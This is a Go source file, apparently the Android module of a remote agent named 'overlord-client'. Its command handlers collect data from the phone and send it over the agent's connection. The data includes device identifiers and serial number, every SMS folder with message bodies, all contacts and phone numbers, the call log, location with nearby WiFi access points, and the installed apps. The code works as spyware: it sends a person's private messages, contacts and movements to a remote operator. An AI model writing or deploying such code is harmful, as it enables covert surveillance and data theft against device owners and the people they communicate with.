//go:build android

package handlers

import (
	"context"
	"strconv"
	"strings"
	"time"

	"overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"
)

func HandleAndroidDevice(ctx context.Context, env *runtime.Env, envelope map[string]interface{}) error {
	getprop := func(key string) string {
		out, err := androidExec(ctx, 5*time.Second, "getprop", key)
		if err != nil {
			return ""
		}
		return strings.TrimSpace(out)
	}

	sdkStr := getprop("ro.build.version.sdk")
	sdk, _ := strconv.Atoi(strings.TrimSpace(sdkStr))

	info := wire.AndroidDeviceInfo{
		Type:         "android_device",
		Model:        getprop("ro.product.model"),
		Manufacturer: getprop("ro.product.manufacturer"),
		AndroidVer:   getprop("ro.build.version.release"),
		SDK:          sdk,
		BuildFP:      getprop("ro.build.fingerprint"),
		Brand:        getprop("ro.product.brand"),
		Device:       getprop("ro.product.device"),
		DisplayID:    getprop("ro.build.display.id"),
		SecurityPatch: getprop("ro.build.version.security_patch"),
		BuildTime:    getprop("ro.build.date.utc"),
		Serial:       getprop("ro.serialno"),
	}

	// Battery via dumpsys
	if out, err := androidExec(ctx, 10*time.Second, "dumpsys", "battery"); err == nil {
		parseBatteryInfo(out, &info)
	}

	// Storage via stat -f /data
	if out, err := androidExec(ctx, 5*time.Second, "stat", "-f", "/data"); err == nil {
		parseStorageInfo(out, &info)
	}

	// RAM via /proc/meminfo
	if out, err := androidExec(ctx, 5*time.Second, "cat", "/proc/meminfo"); err == nil {
		parseMemInfo(out, &info)
	}

	// CPU info
	if out, err := androidExec(ctx, 5*time.Second, "cat", "/proc/cpuinfo"); err == nil {
		info.CPUInfo = extractCPUInfo(out)
	}

	// Screen size + density
	if out, err := androidExec(ctx, 5*time.Second, "wm", "size"); err == nil {
		if parts := strings.Fields(out); len(parts) >= 2 {
			info.ScreenSize = strings.TrimSpace(parts[len(parts)-1])
		}
	}
	if out, err := androidExec(ctx, 5*time.Second, "wm", "density"); err == nil {
		dpiStr := strings.TrimSpace(strings.TrimPrefix(out, "Physical density:"))
		if d, err := strconv.Atoi(strings.TrimSpace(dpiStr)); err == nil {
			info.ScreenDPI = d
		}
	}

	// Uptime
	if out, err := androidExec(ctx, 5*time.Second, "cat", "/proc/uptime"); err == nil {
		parts := strings.Fields(out)
		if len(parts) > 0 {
			if secs, err := strconv.ParseFloat(parts[0], 64); err == nil {
				info.Uptime = int64(secs)
			}
		}
	}

	// WiFi info
	if out, err := androidExec(ctx, 10*time.Second, "dumpsys", "wifi"); err == nil {
		parseWiFiInfo(out, &info)
	}

	return wire.WriteMsg(ctx, env.Conn, info)
}

var batteryStatusMap = map[string]string{
	"1": "Unknown", "2": "Charging", "3": "Discharging",
	"4": "Not Charging", "5": "Full",
}
var batteryHealthMap = map[string]string{
	"1": "Unknown", "2": "Good", "3": "Overheat",
	"4": "Dead", "5": "Over Voltage", "6": "Unspecified", "7": "Cold",
}

func parseBatteryInfo(out string, info *wire.AndroidDeviceInfo) {
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		switch {
		case strings.HasPrefix(line, "level:"):
			if l, err := strconv.Atoi(strings.TrimSpace(strings.TrimPrefix(line, "level:"))); err == nil {
				info.BatteryLevel = l
			}
		case strings.HasPrefix(line, "status:"):
			code := strings.TrimSpace(strings.TrimPrefix(line, "status:"))
			if name, ok := batteryStatusMap[code]; ok {
				info.BatteryStatus = name
			} else {
				info.BatteryStatus = code
			}
		case strings.HasPrefix(line, "health:"):
			code := strings.TrimSpace(strings.TrimPrefix(line, "health:"))
			if name, ok := batteryHealthMap[code]; ok {
				info.BatteryHealth = name
			} else {
				info.BatteryHealth = code
			}
		case strings.HasPrefix(line, "temperature:"):
			if t, err := strconv.ParseInt(strings.TrimSpace(strings.TrimPrefix(line, "temperature:")), 10, 64); err == nil {
				info.BatteryTemp = float64(t) / 10.0
			}
		}
	}
}

func parseStorageInfo(out string, info *wire.AndroidDeviceInfo) {
	// stat -f /data output format:
	//   File: "/data"
	//     ID: ... Namelen: ... Type: ...
	// Block Size: 4096    Fundamental block size: 4096
	// Blocks: Total: 12848636  Free: 1789954  Available: 1757186
	var blockSize int64
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "Block Size:") {
			parts := strings.Fields(line)
			if len(parts) >= 3 {
				blockSize, _ = strconv.ParseInt(parts[2], 10, 64)
			}
		}
		if strings.HasPrefix(line, "Blocks:") {
			parts := strings.Fields(line)
			for i, p := range parts {
				switch {
				case p == "Total:" && i+1 < len(parts):
					total, _ := strconv.ParseInt(parts[i+1], 10, 64)
					info.TotalStorage = total * blockSize
				case p == "Available:" && i+1 < len(parts):
					free, _ := strconv.ParseInt(parts[i+1], 10, 64)
					info.FreeStorage = free * blockSize
				}
			}
		}
	}
}

func parseMemInfo(out string, info *wire.AndroidDeviceInfo) {
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		switch {
		case strings.HasPrefix(line, "MemTotal:"):
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				kb, _ := strconv.ParseInt(fields[1], 10, 64)
				info.TotalRAM = kb * 1024
			}
		case strings.HasPrefix(line, "MemAvailable:"):
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				kb, _ := strconv.ParseInt(fields[1], 10, 64)
				info.AvailableRAM = kb * 1024
			}
		}
	}
}

func extractCPUInfo(out string) string {
	var b strings.Builder
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "Processor") || strings.HasPrefix(line, "Hardware") || strings.HasPrefix(line, "model name") {
			if b.Len() > 0 {
				b.WriteString("; ")
			}
			b.WriteString(line)
		}
	}
	return b.String()
}

func parseWiFiInfo(out string, info *wire.AndroidDeviceInfo) {
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		// Extract SSID from "SSID: vodafoneB92170" or similar
		if strings.Contains(line, "SSID:") && strings.Contains(line, "FREQUENCY:") {
			// This is a scan result line: "SSID: xxxx BSSID: xx:xx:xx:xx:xx:xx FREQUENCY: ..."
			// Skip scan results, we want the connected network
			continue
		}
		if idx := strings.Index(line, "SSID:"); idx >= 0 && !strings.Contains(line, "BSSID:") {
			val := strings.TrimSpace(line[idx+5:])
			// Strip quotes: "vodafoneB92170" -> vodafoneB92170
			val = strings.Trim(val, `"`)
			if val != "" && !strings.EqualFold(val, "null") && !strings.Contains(val, "FQDN:") {
				info.WiFiSSID = val
			}
		}
		// Extract BSSID (must be MAC-like: xx:xx:xx:xx:xx:xx)
		if strings.Contains(line, "BSSID:") {
			if idx := strings.Index(line, "BSSID:"); idx >= 0 {
				rest := strings.TrimSpace(line[idx+6:])
				// Check if it's a MAC address (contains colons in hex pattern)
				if strings.Count(rest, ":") >= 5 {
					if spaceIdx := strings.Index(rest, " "); spaceIdx >= 0 {
						rest = rest[:spaceIdx]
					}
					info.WiFiBSSID = rest
				}
			}
		}
		// Extract link speed
		if strings.Contains(line, "tx_link_speed") || strings.Contains(line, "rx_link_speed") {
			parts := strings.Fields(line)
			for i, p := range parts {
				if p == "tx_link_speed" && i+1 < len(parts) {
					s, _ := strconv.Atoi(parts[i+1])
					if s > 0 {
						info.WiFiSpeed = s
					}
				}
			}
		}
	}
}

// ── SMS ───────────────────────────────────────────────────────────────────────

func HandleAndroidSMS(ctx context.Context, env *runtime.Env, envelope map[string]interface{}) error {
	cmdID, _ := envelope["commandId"].(string)

	projection := "_id:thread_id:address:person:body:date:date_sent:type:status:read:seen:locked:error_code:service_center:subject:protocol:sub_id"
	folders := []struct {
		uri    string
		folder string
	}{
		{"content://sms/inbox", "inbox"},
		{"content://sms/sent", "sent"},
		{"content://sms/draft", "draft"},
		{"content://sms/outbox", "outbox"},
	}

	var all []wire.AndroidSMSMessage
	folderSummary := make(map[string]int)

	for _, f := range folders {
		out, err := androidExec(ctx, 15*time.Second, "content", "query",
			"--uri", f.uri,
			"--projection", projection,
			"--sort", "date DESC",
		)
		if err != nil {
			continue
		}
		rows := parseContentQueryRows(out)
		for _, row := range rows {
			msg := parseSMSRow(row)
			msg.Folder = f.folder
			all = append(all, msg)
			folderSummary[f.folder]++
		}
	}

	if all == nil {
		// Try just inbox as fallback
		out, err := androidExec(ctx, 15*time.Second, "content", "query",
			"--uri", "content://sms/inbox",
			"--projection", projection,
			"--sort", "date DESC",
		)
		if err != nil {
			return wire.WriteMsg(ctx, env.Conn, wire.AndroidSMSResult{
				Type: "android_sms", CommandID: cmdID, Error: err.Error(),
			})
		}
		rows := parseContentQueryRows(out)
		for _, row := range rows {
			msg := parseSMSRow(row)
			msg.Folder = "inbox"
			all = append(all, msg)
		}
		folderSummary["inbox"] = len(all)
	}

	return wire.WriteMsg(ctx, env.Conn, wire.AndroidSMSResult{
		Type:          "android_sms",
		CommandID:     cmdID,
		Messages:      all,
		TotalCount:    len(all),
		FolderSummary: folderSummary,
	})
}

func parseSMSRow(fields map[string]string) wire.AndroidSMSMessage {
	msg := wire.AndroidSMSMessage{
		ID:      fields["_id"],
		Address: fields["address"],
		Body:    fields["body"],
		Subject: fields["subject"],
		Person:  fields["person"],
	}
	if tid, err := strconv.ParseInt(fields["thread_id"], 10, 64); err == nil {
		msg.ThreadID = tid
	}
	if ds, err := strconv.ParseInt(fields["date"], 10, 64); err == nil {
		msg.Date = ds
	}
	if ds, err := strconv.ParseInt(fields["date_sent"], 10, 64); err == nil {
		msg.DateSent = ds
	}
	// SMS "date" column is the received date
	msg.DateReceived = msg.Date
	msg.Read = fields["read"] == "1"
	msg.Seen = fields["seen"] == "1"
	msg.Locked = fields["locked"] == "1"
	if ec, err := strconv.Atoi(fields["error_code"]); err == nil {
		msg.ErrorCode = ec
	}
	msg.ServiceCenter = fields["service_center"]
	if pr, err := strconv.Atoi(fields["protocol"]); err == nil {
		msg.Protocol = pr
	}
	if pr, err := strconv.Atoi(fields["sub_id"]); err == nil {
		msg.SubID = pr
	}
	msg.ReplyPathPresent = fields["reply_path_present"] == "1"

	// Type: 1=inbox, 2=sent, 3=draft, 4=outbox, 5=failed, 6=queued
	t := fields["type"]
	switch t {
	case "1":
		msg.Status = "received"
	case "2":
		msg.Status = "sent"
	case "3":
		msg.Status = "draft"
	case "4":
		msg.Status = "outbox"
	case "5":
		msg.Status = "failed"
	case "6":
		msg.Status = "queued"
	default:
		msg.Status = t
	}

	return msg
}

// ── Contacts ──────────────────────────────────────────────────────────────────

type phoneInfo struct {
	Number           string
	NormalizedNumber string
	PhoneType        string
}

func HandleAndroidContacts(ctx context.Context, env *runtime.Env, envelope map[string]interface{}) error {
	cmdID, _ := envelope["commandId"].(string)

	// Step 1: query ALL contacts (not just those with phone numbers)
	out, err := androidExec(ctx, 15*time.Second, "content", "query",
		"--uri", "content://com.android.contacts/contacts/",
		"--projection", "_id:display_name:photo_id:last_time_contacted:starred:times_contacted",
	)
	if err != nil {
		return wire.WriteMsg(ctx, env.Conn, wire.AndroidContactsResult{
			Type: "android_contacts", CommandID: cmdID, Error: err.Error(),
		})
	}

	rows := parseContentQueryRows(out)

	// Step 2: query phone numbers separately
	phoneMap := make(map[string]phoneInfo)
	phoneOut, phoneErr := androidExec(ctx, 15*time.Second, "content", "query",
		"--uri", "content://com.android.contacts/data/phones",
		"--projection", "contact_id:data1:data2:data4",
	)
	if phoneErr == nil {
		for _, pr := range parseContentQueryRows(phoneOut) {
			cid := pr["contact_id"]
			if cid == "" {
				continue
			}
			// Keep first number if multiple exist for same contact
			if _, exists := phoneMap[cid]; !exists {
				phoneMap[cid] = phoneInfo{
					Number:           pr["data1"],
					NormalizedNumber: pr["data4"],
					PhoneType:        pr["data2"],
				}
			}
		}
	}

	// Step 3: merge contacts with phone numbers
	var contacts []wire.AndroidContact
	for _, row := range rows {
		c := wire.AndroidContact{
			Name: row["display_name"],
		}
		if p, ok := phoneMap[row["_id"]]; ok {
			c.Number = p.Number
			c.NormalizedNumber = p.NormalizedNumber
			c.Type = p.PhoneType
		}
		if cid, err := strconv.ParseInt(row["_id"], 10, 64); err == nil {
			c.ContactID = cid
		}
		if tc, err := strconv.Atoi(row["times_contacted"]); err == nil {
			c.TimesContacted = tc
		}
		c.Starred = row["starred"] == "1"
		if lc, err := strconv.ParseInt(row["last_time_contacted"], 10, 64); err == nil {
			c.LastContacted = lc
		}
		contacts = append(contacts, c)
	}

	return wire.WriteMsg(ctx, env.Conn, wire.AndroidContactsResult{
		Type: "android_contacts", CommandID: cmdID, Contacts: contacts,
	})
}

// ── Call Log ───────────────────────────────────────────────────────────────────

func HandleAndroidCallLog(ctx context.Context, env *runtime.Env, envelope map[string]interface{}) error {
	cmdID, _ := envelope["commandId"].(string)

	projection := "_id:number:name:type:duration:date:geocoded_location:countryiso:voicemail_uri:presentation:features:data_usage:matched_number:new"
	out, err := androidExec(ctx, 15*time.Second, "content", "query",
		"--uri", "content://call_log/calls",
		"--projection", projection,
		"--sort", "date DESC",
	)
	if err != nil {
		return wire.WriteMsg(ctx, env.Conn, wire.AndroidCallLogResult{
			Type: "android_calllog", CommandID: cmdID, Error: err.Error(),
		})
	}

	rows := parseContentQueryRows(out)
	var calls []wire.AndroidCallLogEntry
	for _, row := range rows {
		entry := wire.AndroidCallLogEntry{
			Number:           row["number"],
			Name:             row["name"],
			GeocodedLocation: row["geocoded_location"],
			CountryISO:       row["countryiso"],
			VoicemailURI:     row["voicemail_uri"],
			MatchedNumber:    row["matched_number"],
		}

		if ds, ok := row["duration"]; ok {
			if d, err := strconv.ParseInt(ds, 10, 64); err == nil {
				entry.Duration = d
			}
		}
		if ds, ok := row["date"]; ok {
			if d, err := strconv.ParseInt(ds, 10, 64); err == nil {
				entry.Date = d
			}
		}

		if p, err := strconv.Atoi(row["presentation"]); err == nil {
			entry.Presentation = p
		}
		if f, err := strconv.Atoi(row["features"]); err == nil {
			entry.Features = f
		}
		if du, err := strconv.ParseInt(row["data_usage"], 10, 64); err == nil {
			entry.DataUsage = du
		}
		entry.New = row["new"] == "1"

		t := row["type"]
		switch t {
		case "1":
			entry.Type = "incoming"
		case "2":
			entry.Type = "outgoing"
		case "3":
			entry.Type = "missed"
		case "4":
			entry.Type = "voicemail"
		case "5":
			entry.Type = "rejected"
		case "6":
			entry.Type = "blocked"
		default:
			entry.Type = t
		}

		calls = append(calls, entry)
	}

	return wire.WriteMsg(ctx, env.Conn, wire.AndroidCallLogResult{
		Type: "android_calllog", CommandID: cmdID, Calls: calls,
	})
}

// ── Location ──────────────────────────────────────────────────────────────────

func HandleAndroidLocation(ctx context.Context, env *runtime.Env, envelope map[string]interface{}) error {
	cmdID, _ := envelope["commandId"].(string)
	result := wire.AndroidLocation{Type: "android_location", CommandID: cmdID}

	// Try dumpsys location for last known + provider-based location
	out, err := androidExec(ctx, 10*time.Second, "dumpsys", "location")
	if err != nil {
		result.Error = err.Error()
		return wire.WriteMsg(ctx, env.Conn, result)
	}

	result = parseDumpsysLocation(out)
	result.Type = "android_location"
	result.CommandID = cmdID

	// Try WiFi AP scan for ambient location data
	if wifiOut, err := androidExec(ctx, 10*time.Second, "dumpsys", "wifi"); err == nil {
		aps := parseWiFiAPs(wifiOut)
		if len(aps) > 0 {
			result.WiFiAPS = aps
		}
	}

	return wire.WriteMsg(ctx, env.Conn, result)
}

func parseWiFiAPs(out string) []wire.AndroidWiFiAP {
	var aps []wire.AndroidWiFiAP
	scanning := false
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if strings.Contains(line, "Scan results") || strings.Contains(line, "scan results") {
			scanning = true
			continue
		}
		if scanning && strings.HasPrefix(line, "BSSID:") {
			// Format: "BSSID: xx:xx:xx:xx:xx:xx SSID: xxxx Frequency: 1234 Level: -56 Capabilities: xxxx"
			ap := wire.AndroidWiFiAP{}
			parts := strings.Fields(line)
			for i, p := range parts {
				switch {
				case strings.HasPrefix(p, "BSSID:") && i+1 < len(parts):
					ap.BSSID = parts[i+1]
				case strings.HasPrefix(p, "SSID:") && i+1 < len(parts):
					ap.SSID = parts[i+1]
				case strings.HasPrefix(p, "Frequency:") && i+1 < len(parts):
					f, _ := strconv.Atoi(parts[i+1])
					ap.Frequency = f
				case strings.HasPrefix(p, "Level:") && i+1 < len(parts):
					l, _ := strconv.Atoi(parts[i+1])
					ap.Level = l
				case strings.HasPrefix(p, "Capabilities:") && i+1 < len(parts):
					ap.Capabilities = parts[i+1]
				}
			}
			if ap.BSSID != "" {
				aps = append(aps, ap)
			}
		}
	}
	return aps
}

func parseDumpsysLocation(output string) wire.AndroidLocation {
	var loc wire.AndroidLocation
	lines := strings.Split(output, "\n")
	for i, line := range lines {
		line = strings.TrimSpace(line)

		// Parse "last known location" lines
		if strings.Contains(line, "last known location") || strings.Contains(line, "Last Known Location:") {
			if i+1 < len(lines) {
				fields := strings.Fields(lines[i+1])
				for j, f := range fields {
					if f == "latitude:" && j+1 < len(fields) {
						loc.Lat, _ = strconv.ParseFloat(fields[j+1], 64)
					}
					if f == "longitude:" && j+1 < len(fields) {
						loc.Lon, _ = strconv.ParseFloat(fields[j+1], 64)
					}
				}
			}
		}

		// Parse provider location lines: Location[network ...] lat=xx, lon=yy, acc=zz
		if strings.Contains(line, "Location[") {
			for _, part := range strings.Split(line, " ") {
				part = strings.TrimSuffix(part, ",")
				switch {
				case strings.HasPrefix(part, "lat="):
					loc.Lat, _ = strconv.ParseFloat(strings.TrimPrefix(part, "lat="), 64)
				case strings.HasPrefix(part, "lon="):
					loc.Lon, _ = strconv.ParseFloat(strings.TrimPrefix(part, "lon="), 64)
				case strings.HasPrefix(part, "acc="):
					loc.Accuracy, _ = strconv.ParseFloat(strings.TrimPrefix(part, "acc="), 64)
				case strings.HasPrefix(part, "alt="):
					loc.Altitude, _ = strconv.ParseFloat(strings.TrimPrefix(part, "alt="), 64)
				case strings.HasPrefix(part, "bear="):
					loc.Bearing, _ = strconv.ParseFloat(strings.TrimPrefix(part, "bear="), 64)
				case strings.HasPrefix(part, "speed="):
					loc.Speed, _ = strconv.ParseFloat(strings.TrimPrefix(part, "speed="), 64)
				}
			}
			// Extract provider name from Location[provider
			if idx := strings.Index(line, "Location["); idx >= 0 {
				rest := line[idx+9:]
				if end := strings.IndexAny(rest, " ]"); end >= 0 {
					loc.Provider = rest[:end]
				}
			}
		}

		// Extract provider status
		if strings.Contains(line, "provider=") && strings.Contains(line, "status=") {
			parts := strings.Fields(line)
			for _, p := range parts {
				if strings.HasPrefix(p, "status=") {
					s := strings.TrimPrefix(p, "status=")
					if loc.Provider == "" {
						loc.Provider = s
					}
				}
			}
		}
	}

	return loc
}

// ── Apps ──────────────────────────────────────────────────────────────────────

func HandleAndroidApps(ctx context.Context, env *runtime.Env, envelope map[string]interface{}) error {
	cmdID, _ := envelope["commandId"].(string)

	// List all packages with APK paths and version codes
	out, err := androidExec(ctx, 15*time.Second, "pm", "list", "packages", "-f", "--user", "0", "--show-versioncode")
	if err != nil {
		return wire.WriteMsg(ctx, env.Conn, wire.AndroidAppListResult{
			Type: "android_apps", CommandID: cmdID, Error: err.Error(),
		})
	}

	// Get system packages set
	systemPkgs := getSystemPackages(ctx)

	// Parse dumpsys package packages for detailed info
	pkgDetails := fetchPackageDetails(ctx)

	// Get third-party packages set
	thirdPkgs := getThirdPartyPackages(ctx)

	var apps []wire.AndroidApp
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if !strings.HasPrefix(line, "package:") {
			continue
		}
		// Format: package:/data/app/~~xxx/com.example.app-xxx/base.apk=12345
		rest := strings.TrimPrefix(line, "package:")
		pkg := extractPackageName(rest)

		if pkg == "" {
			continue
		}

		app := wire.AndroidApp{PackageName: pkg}

		// Parse version code from after =
		if eqIdx := strings.LastIndex(rest, "="); eqIdx >= 0 {
			if vc, err := strconv.Atoi(strings.TrimSpace(rest[eqIdx+1:])); err == nil {
				app.VersionCode = vc
			}
		}

		// System app check
		if _, ok := systemPkgs[pkg]; ok {
			app.SystemApp = true
		}
		if _, ok := thirdPkgs[pkg]; ok {
			app.SystemApp = false
		}

		// Fill in details from dumpsys
		if details, ok := pkgDetails[pkg]; ok {
			app.Name = details.name
			app.VersionName = details.versionName
			app.FirstInstallTime = details.firstInstallTime
			app.UpdateTime = details.updateTime
			app.InstallTime = details.installTime
			app.UID = details.uid
			app.Enabled = details.enabled
			app.LastUsedTime = details.lastUsedTime
		}

		apps = append(apps, app)
	}

	return wire.WriteMsg(ctx, env.Conn, wire.AndroidAppListResult{
		Type: "android_apps", CommandID: cmdID, Apps: apps,
	})
}

type pkgDetail struct {
	name             string
	versionName      string
	firstInstallTime int64
	updateTime       int64
	installTime      int64
	uid              int
	enabled          bool
	lastUsedTime     int64
}

func getSystemPackages(ctx context.Context) map[string]struct{} {
	out, err := androidExec(ctx, 10*time.Second, "pm", "list", "packages", "-s", "--user", "0")
	if err != nil {
		return nil
	}
	pkgs := make(map[string]struct{})
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "package:") {
			pkgs[strings.TrimPrefix(line, "package:")] = struct{}{}
		}
	}
	return pkgs
}

func getThirdPartyPackages(ctx context.Context) map[string]struct{} {
	out, err := androidExec(ctx, 10*time.Second, "pm", "list", "packages", "-3", "--user", "0")
	if err != nil {
		return nil
	}
	pkgs := make(map[string]struct{})
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "package:") {
			pkgs[strings.TrimPrefix(line, "package:")] = struct{}{}
		}
	}
	return pkgs
}

func fetchPackageDetails(ctx context.Context) map[string]pkgDetail {
	out, err := androidExec(ctx, 30*time.Second, "dumpsys", "package", "packages")
	if err != nil {
		return nil
	}

	details := make(map[string]pkgDetail)
	var currentPkg string
	var current pkgDetail

	for _, line := range strings.Split(out, "\n") {
		trimmed := strings.TrimSpace(line)

		// Detect new Package section: "  Package [com.example.app] (123abc):"
		if strings.HasPrefix(trimmed, "Package [") && strings.Contains(trimmed, "]") {
			if currentPkg != "" {
				details[currentPkg] = current
			}
			start := strings.Index(trimmed, "[") + 1
			end := strings.Index(trimmed, "]")
			if start > 0 && end > start {
				currentPkg = trimmed[start:end]
			} else {
				currentPkg = ""
			}
			current = pkgDetail{enabled: true}
			continue
		}

		if currentPkg == "" {
			continue
		}

		switch {
		case strings.HasPrefix(trimmed, "versionName="):
			current.versionName = strings.TrimPrefix(trimmed, "versionName=")

		case strings.HasPrefix(trimmed, "firstInstallTime="):
			val := strings.TrimPrefix(trimmed, "firstInstallTime=")
			if t, err := strconv.ParseInt(val, 10, 64); err == nil {
				current.firstInstallTime = t
			}

		case strings.HasPrefix(trimmed, "lastUpdateTime="):
			val := strings.TrimPrefix(trimmed, "lastUpdateTime=")
			if t, err := strconv.ParseInt(val, 10, 64); err == nil {
				current.updateTime = t
			}

		case strings.HasPrefix(trimmed, "installTime="):
			val := strings.TrimPrefix(trimmed, "installTime=")
			if t, err := strconv.ParseInt(val, 10, 64); err == nil {
				current.installTime = t
			}

		case strings.HasPrefix(trimmed, "userId="):
			val := strings.TrimPrefix(trimmed, "userId=")
			if u, err := strconv.Atoi(val); err == nil {
				current.uid = u
			}

		case strings.HasPrefix(trimmed, "enabled="):
			current.enabled = strings.TrimPrefix(trimmed, "enabled=") == "1"

		case strings.Contains(trimmed, "applicationInfo="):
			// Try to extract label=... from applicationInfo
			if idx := strings.Index(trimmed, "label="); idx >= 0 {
				label := trimmed[idx+6:]
				if end := strings.IndexAny(label, " }"); end >= 0 {
					current.name = label[:end]
				}
			}
		}
	}

	// Save last package
	if currentPkg != "" {
		details[currentPkg] = current
	}

	return details
}

func extractPackageName(apkPath string) string {
	// Format: /data/app/~~xxx/com.example.app-xxx/base.apk or just /data/app/com.example.app-1/base.apk
	// Or: /system/app/SomeApp/SomeApp.apk=com.example.app
	// Sometimes the path ends with =versionCode, find package name from the path

	// First try: path=/data/app/.../base.apk where the package name is before /base.apk
	if strings.HasSuffix(apkPath, ".apk") || strings.Contains(apkPath, ".apk=") {
		// Strip version code suffix after =
		if eqIdx := strings.LastIndex(apkPath, "="); eqIdx >= 0 {
			apkPath = apkPath[:eqIdx]
		}

		// For paths like /data/app/~~random/com.example.app-1/base.apk
		// The package name is com.example.app
		if idx := strings.Index(apkPath, "com."); idx >= 0 {
			rest := apkPath[idx:]
			if slashIdx := strings.Index(rest, "/"); slashIdx >= 0 {
				rest = rest[:slashIdx]
			}
			// Strip trailing -number
			if dashIdx := strings.LastIndex(rest, "-"); dashIdx >= 0 {
				rest = rest[:dashIdx]
			}
			return rest
		}
		// Try org., net., etc.
		for _, prefix := range []string{"org.", "net.", "io.", "edu."} {
			if idx := strings.Index(apkPath, prefix); idx >= 0 {
				rest := apkPath[idx:]
				if slashIdx := strings.Index(rest, "/"); slashIdx >= 0 {
					rest = rest[:slashIdx]
				}
				if dashIdx := strings.LastIndex(rest, "-"); dashIdx >= 0 {
					rest = rest[:dashIdx]
				}
				return rest
			}
		}
	}

	// Fallback: use the whole string as package name
	return strings.TrimSpace(apkPath)
}

// ── Content query row parser ────────────────────────────────────────────────

// parseContentQueryRows handles multi-line content query output where row body
// values (especially SMS body) can span multiple physical lines.
// Returns a slice of key-value maps, one per logical row.
func parseContentQueryRows(output string) []map[string]string {
	var rows []map[string]string
	var buf strings.Builder
	inRow := false

	for _, line := range strings.Split(output, "\n") {
		trimmed := strings.TrimSpace(line)

		// Detect start of a new Row: N (physical line boundary)
		if strings.HasPrefix(trimmed, "Row:") {
			// If we were building a previous row, finalize it
			if inRow && buf.Len() > 0 {
				fields := parseRowFields(buf.String())
				if fields != nil {
					rows = append(rows, fields)
				}
				buf.Reset()
			}
			inRow = true
			buf.WriteString(line)
		} else if inRow {
			// Continuation of previous row's last field (e.g., multi-line SMS body)
			// Append with newline so the body value is preserved
			buf.WriteByte('\n')
			buf.WriteString(line)
		}
	}

	// Don't forget the last row
	if inRow && buf.Len() > 0 {
		fields := parseRowFields(buf.String())
		if fields != nil {
			rows = append(rows, fields)
		}
	}

	return rows
}

// parseRowFields parses a single "content query" output line.
// Format: "Row: 0 address=STATUSPAGE, body=Hello, date=1234567890"
func parseRowFields(line string) map[string]string {
	fields := make(map[string]string)

	// Skip "Row: N" prefix
	afterRow := line
	if idx := strings.Index(line, "Row:"); idx >= 0 {
		rest := line[idx+4:]
		rest = strings.TrimSpace(rest)
		if spaceIdx := strings.Index(rest, " "); spaceIdx >= 0 {
			afterRow = rest[spaceIdx+1:]
		}
	}

	// Parse key=value pairs separated by comma+space or just comma
	// Handle commas inside values by tracking the value portion
	var buf strings.Builder
	inValue := false
	for i := 0; i < len(afterRow); i++ {
		ch := afterRow[i]
		if ch == '=' {
			inValue = true
			buf.WriteByte(ch)
		} else if inValue && ch == ',' && (i+1 >= len(afterRow) || afterRow[i+1] == ' ') {
			// End of a key=value pair
			buf.WriteByte(ch)
			pair := strings.TrimSpace(buf.String())
			if pair != "" {
				if eq := strings.IndexByte(pair, '='); eq >= 0 {
					k := strings.TrimSpace(pair[:eq])
					v := strings.TrimRight(pair[eq+1:], ", ")
					if k != "" {
						fields[k] = v
					}
				}
			}
			buf.Reset()
			inValue = false
		} else {
			buf.WriteByte(ch)
		}
	}
	// Last pair
	if buf.Len() > 0 {
		pair := strings.TrimSpace(buf.String())
		if eq := strings.IndexByte(pair, '='); eq >= 0 {
			k := strings.TrimSpace(pair[:eq])
			v := strings.TrimRight(pair[eq+1:], ", ")
			if k != "" {
				fields[k] = v
			}
		}
	}

	return fields
}
